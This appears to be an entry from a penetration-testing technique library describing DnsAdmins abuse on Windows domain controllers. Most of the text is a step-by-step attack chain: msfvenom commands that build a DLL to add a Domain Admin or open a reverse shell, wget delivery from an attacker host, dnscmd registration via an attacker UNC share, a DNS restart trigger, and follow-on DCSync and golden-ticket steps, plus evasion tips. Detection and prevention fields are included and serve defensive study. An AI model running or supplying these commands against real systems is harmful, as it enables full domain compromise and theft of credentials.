examples.label: Generate a DLL that adds you to Domain Admins
examples.command: msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

examples.label: Register it as the DNS server-level plugin DLL
Restart the DNS service (runs the DLL as SYSTEM)
examples.command: sc stop dns && sc start dns

notes:
=== DnsAdmins — Malicious DLL Loading via DNS Service ===
DnsAdmins can configure a plugin DLL loaded by the DNS service — runs as SYSTEM on DC.

=== TECHNICAL MECHANISM ===
Windows DNS service supports loading custom plugin DLLs.
dnscmd sets: HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
DNS service loads this DLL on next start — runs as NT AUTHORITY\SYSTEM.
DNS typically co-located on DC → SYSTEM on DC = Domain Admin equivalent.

=== FULL ATTACK CHAIN ===
Stage 1: Generate DLL payload
  msfvenom -p windows/x64/exec CMD='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
  OR: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o rev.dll

Stage 2: Deliver DLL to target
  python3 -m http.server 8080
  (on target) wget http://<IP>:8080/adduser.dll -O C:\Windows\Temp\adduser.dll
  Full absolute path REQUIRED — relative paths fail silently

Stage 3: Register DLL path (DnsAdmins membership required)
  dnscmd.exe /config /serverlevelplugindll C:\Windows\Temp\adduser.dll
  Verify: reg query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters"

Stage 4: Trigger DLL load (requires DNS service restart)
  Check restart permission: sc.exe sdshow DNS  (look for RPWP bits for your SID)
  sc stop dns
  sc start dns
  (DNS will fail to start — this is EXPECTED, payload runs before timeout)

Stage 5: Verify
  net group "Domain Admins" /dom

=== CLEANUP (MANDATORY — DNS OUTAGE RISK) ===
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
sc.exe start dns
DNS OUTAGE affects entire domain — coordinate with client before stopping DNS on production DC

=== CHAINING CONTEXT ===
DnsAdmins → DLL load → DA group membership → DCSync → golden ticket
DNS on separate server (not DC) → SYSTEM on DNS server → find other paths to DA
Mimilib.dll alternative → fires on every DNS query → persistent SYSTEM execution
After DA: secretsdump, golden ticket, skeleton key, DCSync

=== WHAT TO LOOK FOR ===
DnsAdmins membership in ANY non-admin account = critical severity
DNS service running on DC (default in most environments) = maximum impact
Cannot restart DNS themselves → must wait for natural restart/reboot (still exploitable)

recommended.note: Quieter DnsAdmins abuse via a WPAD record.
Deliver the malicious DLL to the target.

name: DnsAdmins - Malicious DLL via dnscmd
description: DnsAdmins can set a custom plugin DLL that the DNS service (running as SYSTEM on a DC) loads on restart. Generate a DLL that adds a domain admin, register it with dnscmd, then restart the DNS service.

defense.why_it_works: Members of the DnsAdmins group can configure the DNS service to load a plugin DLL via `dnscmd /config /serverlevelplugindll`. The DNS service (dns.exe) runs as SYSTEM on Domain Controllers. Loading a malicious DLL into this process provides SYSTEM-level code execution on the DC. The DLL is loaded on the next DNS service restart.
defense.prerequisites: Membership in the DnsAdmins group. The malicious DLL must be accessible from the DC (UNC share or local path). Rights to stop and start the DNS service (Server Operators or service-specific ACL).
defense.impact: SYSTEM-level code execution on a Domain Controller. Can be used to add accounts to Domain Admins, dump NTDS.dit, or establish persistent backdoors with DC-level access.
defense.detection: Event ID 4660 (object deleted) / 4670 (permissions changed) on DNS service registry key. Windows Event ID 7045 (new service installed) if payload deploys a service. DNS server diagnostic log shows plugin DLL path change. Registry key HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll should be monitored.
defense.artifacts: Registry: HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll | DNS server event log: plugin loaded | Process: new DLL loaded into dns.exe | Security event log: dnscmd executed by DnsAdmins member
defense.prevention: Audit DnsAdmins membership regularly — treat it as equivalent to Domain Admin. Disable the ServerLevelPluginDll feature via Group Policy if DNS plugins are not used. Restrict DNS service restart rights. Monitor registry key HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters for changes.
defense.misconfiguration: Accounts added to DnsAdmins group without understanding the escalation implications. DNS service restart rights granted to DnsAdmins members. No monitoring on DNS service registry parameters.
defense.vulnerable_config:
# User in DnsAdmins group
Get-ADGroupMember -Identity DnsAdmins
# netadm is a member

# Attacker sets plugin DLL:
dnscmd.exe /config /serverlevelplugindll \\attacker\share\adduser.dll
sc stop dns && sc start dns  # loads malicious DLL as SYSTEM
defense.secure_config:
# Audit DnsAdmins group
Get-ADGroupMember -Identity DnsAdmins

# Remove unnecessary members
Remove-ADGroupMember -Identity DnsAdmins -Members netadm

# Monitor registry (GPO audit)
# Audit HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# Alert: ServerLevelPluginDll value creation/modification
defense.evasion: Use a UNC path to a controlled share for the DLL so no file is dropped on the DC. After DLL loads and payload executes, remove the registry key to reduce persistence artifacts.
